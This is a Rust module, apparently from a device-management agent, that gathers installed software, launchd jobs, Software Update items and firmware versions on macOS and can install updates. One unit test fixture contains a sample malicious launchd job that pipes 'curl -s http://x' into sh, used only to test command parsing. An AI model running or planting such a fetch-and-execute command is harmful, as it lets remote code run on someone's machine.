//! macOS data sources shared by the collectors: installed software (applications, Homebrew,
//! vendor package receipts), launchd jobs, Software Update and the firmware version.
//! Every command output is read by a pure function the tests below cover on any platform.
//! Read-only, except `install_updates`, which the install_patches instruction runs.

use serde_json::{json, Value};
#[cfg(target_os = "macos")]
use std::path::Path;
#[cfg(target_os = "macos")]
use std::sync::Mutex;
#[cfg(target_os = "macos")]
use std::time::{Duration, Instant};

#[cfg(target_os = "macos")]
fn run(cmd: &str, args: &[&str]) -> Option<String> {
    std::process::Command::new(cmd).args(args).output().ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
}

/// A plist file as XML (binary plists included), via the system's plutil.
#[cfg(target_os = "macos")]
fn plist_xml(path: &Path) -> Option<String> {
    run("plutil", &["-convert", "xml1", "-o", "-", &path.to_string_lossy()])
}

fn unescape(s: &str) -> String {
    s.replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&apos;", "'").replace("&amp;", "&")
}

/// The first `<string>` value of `key` in plist XML.
pub(crate) fn plist_string(xml: &str, key: &str) -> Option<String> {
    let after = &xml[xml.find(&format!("<key>{key}</key>"))? + key.len() + 11..];
    let rest = after.trim_start().strip_prefix("<string>")?;
    let value = unescape(rest[..rest.find("</string>")?].trim());
    (!value.is_empty()).then_some(value)
}

/// The `<string>` items of the array under `key` in plist XML.
pub(crate) fn plist_strings(xml: &str, key: &str) -> Vec<String> {
    let Some(at) = xml.find(&format!("<key>{key}</key>")) else { return Vec::new() };
    let after = xml[at + key.len() + 11..].trim_start();
    let Some(body) = after.strip_prefix("<array>").and_then(|b| b.find("</array>").map(|end| &b[..end])) else {
        return Vec::new();
    };
    body.split("<string>").skip(1).filter_map(|s| s.find("</string>").map(|end| unescape(&s[..end]))).collect()
}

/// Name, version and bundle id of an application from its Info.plist.
pub(crate) fn app_from_info(xml: &str, fallback_name: &str) -> Option<(String, String, String)> {
    let version = plist_string(xml, "CFBundleShortVersionString").or_else(|| plist_string(xml, "CFBundleVersion"))?;
    let name = plist_string(xml, "CFBundleDisplayName").or_else(|| plist_string(xml, "CFBundleName"))
        .unwrap_or_else(|| fallback_name.to_string());
    Some((name, version, plist_string(xml, "CFBundleIdentifier").unwrap_or_default()))
}

/// The `version:` line of `pkgutil --pkg-info`.
pub(crate) fn pkg_version(info: &str) -> Option<String> {
    info.lines().find_map(|l| l.strip_prefix("version:")).map(|v| v.trim().to_string()).filter(|v| !v.is_empty())
}

/// Package receipts not installed by Apple.
pub(crate) fn vendor_pkgs(pkgs: &str) -> Vec<&str> {
    pkgs.lines().map(str::trim).filter(|p| !p.is_empty() && !p.starts_with("com.apple.")).collect()
}

#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
fn software(name: &str, version: &str, source: &str, bundle_id: &str) -> Value {
    json!({"name": name, "version": version, "publisher": "", "install_date": "",
           "update_available": false, "source": source, "bundle_id": bundle_id})
}

#[cfg(target_os = "macos")]
static INVENTORY: Mutex<Option<(Instant, Vec<Value>)>> = Mutex::new(None);

/// Installed software, read at most once an hour: applications, Homebrew formulae and casks,
/// and package receipts not from Apple. Each entry has the shape the Windows inventory sends.
#[cfg(target_os = "macos")]
pub fn installed_software() -> Vec<Value> {
    const TTL: Duration = Duration::from_secs(3600);
    let mut guard = INVENTORY.lock().unwrap_or_else(|p| p.into_inner());
    if let Some((at, list)) = guard.as_ref() {
        if at.elapsed() < TTL {
            return list.clone();
        }
    }
    let mut list = applications();
    list.extend(homebrew());
    list.extend(package_receipts());
    list.truncate(2000);
    *guard = Some((Instant::now(), list.clone()));
    list
}

#[cfg(target_os = "macos")]
fn applications() -> Vec<Value> {
    let mut out = Vec::new();
    for dir in ["/Applications", "/Applications/Utilities"] {
        let Ok(entries) = std::fs::read_dir(dir) else { continue };
        for path in entries.flatten().map(|e| e.path()).filter(|p| p.extension().map_or(false, |x| x == "app")) {
            let stem = path.file_stem().map(|s| s.to_string_lossy().into_owned()).unwrap_or_default();
            if let Some((name, version, id)) = plist_xml(&path.join("Contents/Info.plist")).and_then(|x| app_from_info(&x, &stem)) {
                out.push(software(&name, &version, "application", &id));
            }
        }
    }
    out
}

/// The installed version of each formula (the one `opt/` links to) and cask (newest folder).
#[cfg(target_os = "macos")]
fn homebrew() -> Vec<Value> {
    fn newest_dir(dir: &Path) -> Option<String> {
        std::fs::read_dir(dir).ok()?.flatten()
            .filter(|e| e.path().is_dir() && !e.file_name().to_string_lossy().starts_with('.'))
            .max_by_key(|e| e.metadata().and_then(|m| m.modified()).ok())
            .map(|e| e.file_name().to_string_lossy().into_owned())
    }
    let mut out = Vec::new();
    for prefix in ["/opt/homebrew", "/usr/local"] {
        let prefix = Path::new(prefix);
        for (sub, source) in [("Cellar", "homebrew"), ("Caskroom", "homebrew-cask")] {
            let Ok(entries) = std::fs::read_dir(prefix.join(sub)) else { continue };
            for entry in entries.flatten().filter(|e| e.path().is_dir()) {
                let name = entry.file_name().to_string_lossy().into_owned();
                let linked = (source == "homebrew").then(|| std::fs::read_link(prefix.join("opt").join(&name)).ok()).flatten()
                    .and_then(|t| t.file_name().map(|v| v.to_string_lossy().into_owned()));
                if let Some(version) = linked.or_else(|| newest_dir(&entry.path())) {
                    out.push(software(&name, &version, source, ""));
                }
            }
        }
    }
    out
}

#[cfg(target_os = "macos")]
fn package_receipts() -> Vec<Value> {
    let pkgs = run("pkgutil", &["--pkgs"]).unwrap_or_default();
    vendor_pkgs(&pkgs).into_iter().take(300)
        .filter_map(|id| Some(software(id, &pkg_version(&run("pkgutil", &["--pkg-info", id])?)?, "pkg", id)))
        .collect()
}

/// launchd jobs outside the sealed system volume: (kind, plist path, label, command).
#[cfg(target_os = "macos")]
pub fn launchd_jobs() -> Vec<(&'static str, String, String, String)> {
    let mut dirs: Vec<(&'static str, std::path::PathBuf)> = vec![
        ("LaunchDaemon", "/Library/LaunchDaemons".into()),
        ("LaunchAgent", "/Library/LaunchAgents".into()),
    ];
    if let Ok(users) = std::fs::read_dir("/Users") {
        dirs.extend(users.flatten().map(|u| ("User LaunchAgent", u.path().join("Library/LaunchAgents"))));
    }
    let mut jobs = Vec::new();
    for (kind, dir) in dirs {
        let Ok(entries) = std::fs::read_dir(&dir) else { continue };
        for path in entries.flatten().map(|e| e.path()).filter(|p| p.extension().map_or(false, |x| x == "plist")) {
            let Some(xml) = plist_xml(&path) else { continue };
            let label = plist_string(&xml, "Label").unwrap_or_else(|| path.file_stem().unwrap_or_default().to_string_lossy().into_owned());
            jobs.push((kind, path.to_string_lossy().into_owned(), label, launchd_command(&xml)));
        }
    }
    jobs
}

/// What a launchd job runs: ProgramArguments joined, else Program.
pub(crate) fn launchd_command(xml: &str) -> String {
    let args = plist_strings(xml, "ProgramArguments");
    if !args.is_empty() {
        return args.join(" ");
    }
    plist_string(xml, "Program").unwrap_or_else(|| "N/A".to_string())
}

/// A Software Update label as a patch id the platform accepts (letters, digits and `.+_:-`).
pub(crate) fn update_id(label: &str) -> String {
    let id: String = label.chars().map(|c| if c.is_ascii_alphanumeric() || ".+_:-".contains(c) { c } else { '_' }).take(128).collect();
    if id.starts_with(|c: char| c.is_ascii_alphanumeric()) { id } else { format!("U{}", &id[..id.len().min(127)]) }
}

/// The updates in `softwareupdate --list` output: "* Label: X" followed by "Title: T, Version: V, Size: NKiB,
/// Recommended: YES, Action: restart,". Apple gives no severity.
pub(crate) fn parse_update_list(text: &str) -> Vec<Value> {
    let mut out: Vec<Value> = Vec::new();
    for line in text.lines().map(str::trim) {
        if let Some(label) = line.strip_prefix("* Label:").map(str::trim).filter(|l| !l.is_empty()) {
            out.push(json!({"id": update_id(label), "label": label, "title": label, "severity": "Unknown",
                            "mandatory": false, "restart_required": false}));
        } else if let (Some(last), true) = (out.last_mut(), line.starts_with("Title:")) {
            for field in line.split(", ") {
                let Some((key, value)) = field.split_once(':') else { continue };
                let value = value.trim().trim_end_matches(',');
                match key.trim() {
                    "Title" => last["title"] = json!(value),
                    "Version" => last["version"] = json!(value),
                    "Size" => if let Ok(kib) = value.trim_end_matches(|c: char| c.is_alphabetic()).parse::<f64>() {
                        last["size_mb"] = json!((kib / 102.4).round() / 10.0);
                    },
                    "Recommended" => last["mandatory"] = json!(value.eq_ignore_ascii_case("YES")),
                    "Action" => last["restart_required"] = json!(value.contains("restart")),
                    _ => {}
                }
            }
        }
    }
    out
}

/// Available Software Update items, or why the check failed.
#[cfg(target_os = "macos")]
pub fn pending_updates() -> Result<Vec<Value>, String> {
    let out = std::process::Command::new("softwareupdate").arg("--list").output()
        .map_err(|e| format!("softwareupdate could not start: {e}"))?;
    let (stdout, stderr) = (String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr));
    let updates = parse_update_list(&stdout);
    if out.status.success() || !updates.is_empty() || stderr.contains("No new software available") {
        return Ok(updates);
    }
    let why: String = stderr.trim().chars().take(300).collect();
    Err(format!("softwareupdate --list failed: {}", if why.is_empty() { "no output" } else { &why }))
}

/// Installs Software Update items by the ids `pending_updates` gave them. Each id is matched against a
/// fresh list, so only an update Apple offers now is installed; an update that needs a restart is
/// installed and waits for one.
#[cfg(target_os = "macos")]
pub async fn install_updates(ids: &[String], job: &super::patch_installer::PatchJob) -> Vec<Value> {
    use super::patch_installer::{output, patch_result};
    use super::patch_reversible::{deferred_result, NOT_REVERSIBLE, NOT_REVERSIBLE_MESSAGE};
    if job.rollback {
        return ids.iter().map(|id| patch_result(id, "failed", "macOS updates cannot be rolled back", false)).collect();
    }
    if job.require_reversible {
        return ids.iter().map(|id| deferred_result(id, NOT_REVERSIBLE, NOT_REVERSIBLE_MESSAGE)).collect();
    }
    let offered = match tokio::task::spawn_blocking(pending_updates).await {
        Ok(Ok(list)) => list,
        Ok(Err(e)) => return ids.iter().map(|id| patch_result(id, "failed", &e, false)).collect(),
        Err(e) => return ids.iter().map(|id| patch_result(id, "failed", &format!("update check stopped: {e}"), false)).collect(),
    };
    let mut results = Vec::new();
    for id in ids {
        let Some(update) = offered.iter().find(|u| u["id"] == id.as_str()) else {
            results.push(patch_result(id, "skipped", "Software Update no longer offers this update", false));
            continue;
        };
        let label = update["label"].as_str().unwrap_or_default();
        let mut cmd = tokio::process::Command::new("softwareupdate");
        cmd.args(["--install", label, "--agree-to-license"]);
        let restart = update["restart_required"].as_bool().unwrap_or(false);
        results.push(match output(cmd, Duration::from_secs(3600)).await {
            Err(e) => patch_result(id, "failed", &format!("softwareupdate {e}"), false),
            Ok(out) if !out.status.success() => {
                let text = String::from_utf8_lossy(if out.stderr.is_empty() { &out.stdout } else { &out.stderr }).into_owned();
                let tail: String = text.trim().chars().rev().take(400).collect::<Vec<_>>().into_iter().rev().collect();
                patch_result(id, "failed", &format!("softwareupdate failed: {tail}"), false)
            }
            Ok(_) => patch_result(id, "success", &format!("Installed {label}"), restart),
        });
    }
    results
}

/// The firmware version from `system_profiler SPHardwareDataType` ("System Firmware Version" on Apple
/// silicon, "Boot ROM Version" on Intel).
pub(crate) fn firmware_from_hardware(text: &str) -> Option<String> {
    text.lines().map(str::trim)
        .find_map(|l| l.strip_prefix("System Firmware Version:").or_else(|| l.strip_prefix("Boot ROM Version:")))
        .map(|v| v.trim().to_string()).filter(|v| !v.is_empty())
}

#[cfg(target_os = "macos")]
pub fn firmware_version() -> String {
    static FIRMWARE: std::sync::OnceLock<String> = std::sync::OnceLock::new();
    FIRMWARE.get_or_init(|| run("system_profiler", &["SPHardwareDataType"]).and_then(|t| firmware_from_hardware(&t)).unwrap_or_default())
        .clone()
}

#[cfg(test)]
mod tests {
    use super::*;

    const INFO: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
	<key>CFBundleIdentifier</key>
	<string>com.google.Chrome</string>
	<key>CFBundleName</key>
	<string>Chrome</string>
	<key>CFBundleDisplayName</key>
	<string>Google Chrome &amp; More</string>
	<key>CFBundleShortVersionString</key>
	<string>131.0.6778.86</string>
	<key>CFBundleVersion</key>
	<string>6778.86</string>
</dict></plist>"#;

    #[test]
    fn an_application_is_read_from_its_info_plist() {
        assert_eq!(app_from_info(INFO, "Google Chrome"),
                   Some(("Google Chrome & More".into(), "131.0.6778.86".into(), "com.google.Chrome".into())));
        let bare = "<dict><key>CFBundleVersion</key><string>2.1</string></dict>";
        assert_eq!(app_from_info(bare, "Tool"), Some(("Tool".into(), "2.1".into(), String::new())));
        assert_eq!(app_from_info("<dict><key>CFBundleName</key><string>X</string></dict>", "X"), None);
    }

    #[test]
    fn a_launchd_job_runs_its_program_arguments_else_its_program() {
        let job = "<dict><key>Label</key><string>com.evil.updater</string><key>ProgramArguments</key>\n<array>\n\
                   <string>/bin/sh</string>\n<string>-c</string>\n<string>curl -s http://x | sh</string>\n</array></dict>";
        assert_eq!(plist_string(job, "Label").as_deref(), Some("com.evil.updater"));
        assert_eq!(launchd_command(job), "/bin/sh -c curl -s http://x | sh");
        assert_eq!(launchd_command("<dict><key>Program</key><string>/usr/local/bin/tool</string></dict>"), "/usr/local/bin/tool");
        assert_eq!(launchd_command("<dict><key>Label</key><string>x</string></dict>"), "N/A");
    }

    #[test]
    fn only_package_receipts_not_from_apple_are_listed() {
        let pkgs = "com.apple.pkg.CLTools_Executables\ncom.microsoft.teams2\n\nus.zoom.pkg.videomeeting\n";
        assert_eq!(vendor_pkgs(pkgs), vec!["com.microsoft.teams2", "us.zoom.pkg.videomeeting"]);
        let info = "package-id: com.microsoft.teams2\nversion: 24295.606.3238.6194\nvolume: /\nlocation: Applications\ninstall-time: 1731000000\n";
        assert_eq!(pkg_version(info).as_deref(), Some("24295.606.3238.6194"));
        assert_eq!(pkg_version("package-id: x\n"), None);
    }

    #[test]
    fn software_update_items_are_parsed_with_an_installable_id() {
        let out = "Software Update Tool\n\nFinding available software\nSoftware Update found the following new or updated software:\n\
                   * Label: macOS Sonoma 14.6.1-23G93\n\tTitle: macOS Sonoma 14.6.1, Version: 14.6.1, Size: 1393532KiB, Recommended: YES, Action: restart, \n\
                   * Label: Command Line Tools for Xcode-15.3\n\tTitle: Command Line Tools for Xcode, Version: 15.3, Size: 1673497KiB, Recommended: NO, \n";
        let updates = parse_update_list(out);
        assert_eq!(updates.len(), 2);
        assert_eq!(updates[0]["id"], "macOS_Sonoma_14.6.1-23G93");
        assert_eq!(updates[0]["label"], "macOS Sonoma 14.6.1-23G93");
        assert_eq!(updates[0]["title"], "macOS Sonoma 14.6.1");
        assert_eq!(updates[0]["version"], "14.6.1");
        assert_eq!(updates[0]["size_mb"], 1360.9);
        assert_eq!((updates[0]["mandatory"].as_bool(), updates[0]["restart_required"].as_bool()), (Some(true), Some(true)));
        assert_eq!((updates[1]["mandatory"].as_bool(), updates[1]["restart_required"].as_bool()), (Some(false), Some(false)));
        assert!(parse_update_list("Software Update Tool\n\nFinding available software\n").is_empty());
    }

    #[test]
    fn every_update_id_passes_the_platform_patch_id_rule() {
        let rule = regex::Regex::new(r"^[A-Za-z0-9][A-Za-z0-9.+_:-]{0,127}$").unwrap();
        for label in ["macOS Sonoma 14.6.1-23G93", "Safari17.5MontereyAuto-17.5", " (odd) label", &"x".repeat(200)] {
            assert!(rule.is_match(&update_id(label)), "{label:?} -> {}", update_id(label));
        }
    }

    #[test]
    fn the_firmware_version_comes_from_either_cpu_family() {
        assert_eq!(firmware_from_hardware("Hardware:\n      Chip: Apple M2\n      System Firmware Version: 10151.121.1\n").as_deref(), Some("10151.121.1"));
        assert_eq!(firmware_from_hardware("      Boot ROM Version: 2022.100.22.0.0 (iBridge: 21.16.365.0.0,0)\n").as_deref(),
                   Some("2022.100.22.0.0 (iBridge: 21.16.365.0.0,0)"));
        assert_eq!(firmware_from_hardware("Model Name: MacBook Pro\n"), None);
    }
}
